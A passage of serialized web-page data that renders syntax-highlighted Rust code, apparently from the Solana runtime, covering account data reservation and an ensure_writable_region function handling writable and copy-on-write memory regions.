token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n43f:[\"$\",\"span\",\"code-segment-198\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n440:[\"$\",\"span\",\"cod"])</script><script>self.__next_f.push([1,"e-segment-199\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"?\"]}]\n441:[\"$\",\"span\",\"code-segment-200\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\n442:[\"$\",\"span\",\"code-segment-201\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n443:[\"$\",\"span\",\"line-number--19\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[19]}]\n444:[\"$\",\"span\",\"line-number--20\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[20]}]\n445:[\"$\",\"span\",\"code-segment-205\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}]\n446:[\"$\",\"span\",\"code-segment-206\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"if\"]}]\n447:[\"$\",\"span\",\"code-segment-207\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" account\"]}]\n448:[\"$\",\"span\",\"code-segment-208\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\n449:[\"$\",\"span\",\"code-segment-209\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"is_shared\"]}]\n44a:[\"$\",\"span\",\"code-segment-210\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n44b:[\"$\",\"span\",\"code-segment-211\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n44c:[\"$\",\"span\",\"code-segment-212\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n44d:[\"$\",\"span\",\"code-segment-213\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}]\n44e:[\"$\",\"span\",\"code-segment-214\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n44f:[\"$\",\"span\",\"line-number--21\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"s"])</script><script>self.__next_f.push([1,"tyle\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[21]}]\n450:[\"$\",\"span\",\"code-segment-216\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}]\n451:[\"$\",\"span\",\"code-segment-217\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// See BorrowedAccount::make_data_mut() as to why we reserve extra\"]}]\n452:[\"$\",\"span\",\"code-segment-218\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n453:[\"$\",\"span\",\"line-number--22\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[22]}]\n454:[\"$\",\"span\",\"code-segment-220\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}]\n455:[\"$\",\"span\",\"code-segment-221\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// MAX_PERMITTED_DATA_INCREASE bytes here.\"]}]\n456:[\"$\",\"span\",\"code-segment-222\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n457:[\"$\",\"span\",\"line-number--23\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[23]}]\n458:[\"$\",\"span\",\"code-segment-224\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                account\"]}]\n459:[\"$\",\"span\",\"code-segment-225\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\n45a:[\"$\",\"span\",\"code-segment-226\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"reserve\"]}]\n45b:[\"$\",\"span\",\"code-segment-227\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n45c:[\"$\",\"span\",\"code-segment-228\",{\"className\":\"to"])</script><script>self.__next_f.push([1,"ken token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"MAX_PERMITTED_DATA_INCREASE\"]}]\n45d:[\"$\",\"span\",\"code-segment-229\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n45e:[\"$\",\"span\",\"code-segment-230\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\n45f:[\"$\",\"span\",\"code-segment-231\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n460:[\"$\",\"span\",\"line-number--24\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[24]}]\n461:[\"$\",\"span\",\"code-segment-233\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}]\n462:[\"$\",\"span\",\"code-segment-234\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\n463:[\"$\",\"span\",\"code-segment-235\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n464:[\"$\",\"span\",\"line-number--25\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[25]}]\n465:[\"$\",\"span\",\"code-segment-237\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}]\n466:[\"$\",\"span\",\"code-segment-238\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Ok\"]}]\n467:[\"$\",\"span\",\"code-segment-239\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n468:[\"$\",\"span\",\"code-segment-240\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"account\"]}]\n469:[\"$\",\"span\",\"code-segment-241\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\n46a:[\"$\",\"span\",\"code-segment-242\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"data_as_mut_slice\"]}]\n46b:[\"$\",\"span\",\"code-segment-243\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"}"])</script><script>self.__next_f.push([1,",\"children\":[\"(\"]}]\n46c:[\"$\",\"span\",\"code-segment-244\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n46d:[\"$\",\"span\",\"code-segment-245\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\n46e:[\"$\",\"span\",\"code-segment-246\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"as_mut_ptr\"]}]\n46f:[\"$\",\"span\",\"code-segment-247\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n470:[\"$\",\"span\",\"code-segment-248\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n471:[\"$\",\"span\",\"code-segment-249\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n472:[\"$\",\"span\",\"code-segment-250\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"as\"]}]\n473:[\"$\",\"span\",\"code-segment-251\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n474:[\"$\",\"span\",\"code-segment-252\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}]\n475:[\"$\",\"span\",\"code-segment-253\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n476:[\"$\",\"span\",\"code-segment-254\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n477:[\"$\",\"span\",\"line-number--26\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[26]}]\n478:[\"$\",\"span\",\"code-segment-256\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\n479:[\"$\",\"span\",\"code-segment-257\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\n47a:[\"$\",\"span\",\"code-segment-258\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n47b:[\"$\",\"span\",\"code-segment-259\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n47c:[\"$\",\"span\",\"code-segment-260\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n47d:[\"$\",\"span\",\"code-segment-261\",{\"className\":\""])</script><script>self.__next_f.push([1,"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n47e:[\"$\",\"span\",\"line-number--27\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[27]}]\n47f:[\"$\",\"span\",\"code-segment-263\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n480:[\"$\",\"span\",\"code-segment-264\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n481:[\"$\",\"span\",\"code-segment-265\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"?\"]}]\n482:[\"$\",\"span\",\"code-segment-266\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\n483:[\"$\",\"span\",\"code-segment-267\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n484:[\"$\",\"span\",\"line-number--28\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[28]}]\n485:[\"$\",\"span\",\"code-segment-269\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n486:[\"$\",\"span\",\"code-segment-270\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"...\"]}]\n487:[\"$\",\"span\",\"code-segment-271\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n488:[\"$\",\"span\",\"line-number--29\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[29]}]\n489:[\"$\",\"span\",\"code-segment-273\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}]\n48a:[\"$\",\"span\",\"code-segment-274\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n48b:[\"$\",\"span\",\"code-segment-275\",{\"className\":\"$undefined\",\"styl"])</script><script>self.__next_f.push([1,"e\":{},\"children\":[\"\\n\"]}]\n48c:[\"$\",\"span\",\"line-number--30\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[30]}]\n48d:[\"$\",\"span\",\"line-number--31\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[31]}]\n48e:[\"$\",\"span\",\"code-segment-279\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}]\n48f:[\"$\",\"span\",\"code-segment-280\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"fn\"]}]\n490:[\"$\",\"span\",\"code-segment-281\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n491:[\"$\",\"span\",\"code-segment-282\",{\"className\":\"token token function-definition\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"ensure_writable_region\"]}]\n492:[\"$\",\"span\",\"code-segment-283\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n493:[\"$\",\"span\",\"code-segment-284\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"region\"]}]\n494:[\"$\",\"span\",\"code-segment-285\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\n495:[\"$\",\"span\",\"code-segment-286\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n496:[\"$\",\"span\",\"code-segment-287\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}]\n497:[\"$\",\"span\",\"code-segment-288\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"MemoryRegion\"]}]\n498:[\"$\",\"span\",\"code-segment-289\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n499:[\"$\",\"span\",\"code-segment-290\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" cow_cb\"]}]\n49a:[\"$\",\"span\",\"code-segment-291\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\n49b:[\"$\",\"span\","])</script><script>self.__next_f.push([1,"\"code-segment-292\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n49c:[\"$\",\"span\",\"code-segment-293\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}]\n49d:[\"$\",\"span\",\"code-segment-294\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Option\"]}]\n49e:[\"$\",\"span\",\"code-segment-295\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}]\n49f:[\"$\",\"span\",\"code-segment-296\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"MemoryCowCallback\"]}]\n4a0:[\"$\",\"span\",\"code-segment-297\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}]\n4a1:[\"$\",\"span\",\"code-segment-298\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n4a2:[\"$\",\"span\",\"code-segment-299\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n4a3:[\"$\",\"span\",\"code-segment-300\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"-\u003e\"]}]\n4a4:[\"$\",\"span\",\"code-segment-301\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n4a5:[\"$\",\"span\",\"code-segment-302\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"bool\"]}]\n4a6:[\"$\",\"span\",\"code-segment-303\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n4a7:[\"$\",\"span\",\"code-segment-304\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}]\n4a8:[\"$\",\"span\",\"code-segment-305\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n4a9:[\"$\",\"span\",\"line-number--32\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[32]}]\n4aa:[\"$\",\"span\",\"code-segment-307\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n4ab:[\"$\",\"span\",\"code-segment-308\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"match\"]}]\n4ac:[\"$\",\"span\",\"code-segment-309\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]"])</script><script>self.__next_f.push([1,"\n4ad:[\"$\",\"span\",\"code-segment-310\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n4ae:[\"$\",\"span\",\"code-segment-311\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"region\"]}]\n4af:[\"$\",\"span\",\"code-segment-312\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\n4b0:[\"$\",\"span\",\"code-segment-313\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"state\"]}]\n4b1:[\"$\",\"span\",\"code-segment-314\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\n4b2:[\"$\",\"span\",\"code-segment-315\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"get\"]}]\n4b3:[\"$\",\"span\",\"code-segment-316\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n4b4:[\"$\",\"span\",\"code-segment-317\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n4b5:[\"$\",\"span\",\"code-segment-318\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n4b6:[\"$\",\"span\",\"code-segment-319\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" cow_cb\"]}]\n4b7:[\"$\",\"span\",\"code-segment-320\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n4b8:[\"$\",\"span\",\"code-segment-321\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n4b9:[\"$\",\"span\",\"code-segment-322\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}]\n4ba:[\"$\",\"span\",\"code-segment-323\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n4bb:[\"$\",\"span\",\"line-number--33\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[33]}]\n4bc:[\"$\",\"span\",\"code-segment-325\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\n4bd:[\"$\",\"span\",\"code-segment-326\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n4be:[\"$\",\"span\",\"code-segment-327\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children"])</script><script>self.__next_f.push([1,"\":[\"MemoryState\"]}]\n4bf:[\"$\",\"span\",\"code-segment-328\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}]\n4c0:[\"$\",\"span\",\"code-segment-329\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Writable\"]}]\n4c1:[\"$\",\"span\",\"code-segment-330\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n4c2:[\"$\",\"span\",\"code-segment-331\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" _\"]}]\n4c3:[\"$\",\"span\",\"code-segment-332\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n4c4:[\"$\",\"span\",\"code-segment-333\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n4c5:[\"$\",\"span\",\"code-segment-334\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\u003e\"]}]\n4c6:[\"$\",\"span\",\"code-segment-335\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n4c7:[\"$\",\"span\",\"code-segment-336\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"true\"]}]\n4c8:[\"$\",\"span\",\"code-segment-337\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n4c9:[\"$\",\"span\",\"code-segment-338\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n4ca:[\"$\",\"span\",\"line-number--34\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[34]}]\n4cb:[\"$\",\"span\",\"code-segment-340\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\n4cc:[\"$\",\"span\",\"code-segment-341\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n4cd:[\"$\",\"span\",\"code-segment-342\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"MemoryState\"]}]\n4ce:[\"$\",\"span\",\"code-segment-343\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}]\n4cf:[\"$\",\"span\",\"code-segment-344\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Cow\"]}]\n4d0:[\"$\",\"span\",\"code-segment-345\",{\"classNa"])</script><script>self.__next_f.push([1,"me\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n4d1:[\"$\",\"span\",\"code-segment-346\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"cow_id\"]}]\n4d2:[\"$\",\"span\",\"code-segment-347\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n4d3:[\"$\",\"span\",\"code-segment-348\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n4d4:[\"$\",\"span\",\"code-segment-349\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n4d5:[\"$\",\"span\",\"code-segment-350\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Some\"]}]\n4d6:[\"$\",\"span\",\"code-segment-351\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n4d7:[\"$\",\"span\",\"code-segment-352\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"cb\"]}]\n4d8:[\"$\",\"span\",\"code-segment-353\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n4d9:[\"$\",\"span\",\"code-segment-354\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n4da:[\"$\",\"span\",\"code-segment-355\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n4db:[\"$\",\"span\",\"code-segment-356\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\u003e\"]}]\n4dc:[\"$\",\"span\",\"code-segment-357\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n4dd:[\"$\",\"span\",\"code-segment-358\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"match\"]}]\n4de:[\"$\",\"span\",\"code-segment-359\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n4df:[\"$\",\"span\",\"code-segment-360\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"cb\"]}]\n4e0:[\"$\",\"span\",\"code-segment-361\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n4e1:[\"$\",\"span\",\"code-segment-362\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"cow_id\"]}]\n4e2:[\"$\",\"span\",\"code-segment-363\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n4e3:[\"$\",\"span\",\"code-segment-364\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n4e4:[\"$\",\"span\",\"code-segment-365\",{\"className\":\"token token"])</script><script>self.__next_f.push([1,"\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}]\n4e5:[\"$\",\"span\",\"code-segment-366\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n4e6:[\"$\",\"span\",\"line-number--35\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[35]}]\n4e7:[\"$\",\"span\",\"code-segment-368\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}]\n4e8:[\"$\",\"span\",\"code-segment-369\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Ok\"]}]\n4e9:[\"$\",\"span\",\"code-segment-370\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n4ea:[\"$\",\"span\",\"code-segment-371\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"host_addr\"]}]\n4eb:[\"$\",\"span\",\"code-segment-372\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n4ec:[\"$\",\"span\",\"code-segment-373\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n4ed:[\"$\",\"span\",\"code-segment-374\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\u003e\"]}]\n4ee:[\"$\",\"span\",\"code-segment-375\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n4ef:[\"$\",\"span\",\"code-segment-376\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}]\n4f0:[\"$\",\"span\",\"code-segment-377\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n4f1:[\"$\",\"span\",\"line-number--36\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[36]}]\n4f2:[\"$\",\"span\",\"code-segment-379\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                region\"]}]\n4f3:[\"$\",\"span\",\"code-segment-380\",{\"className\":\"token 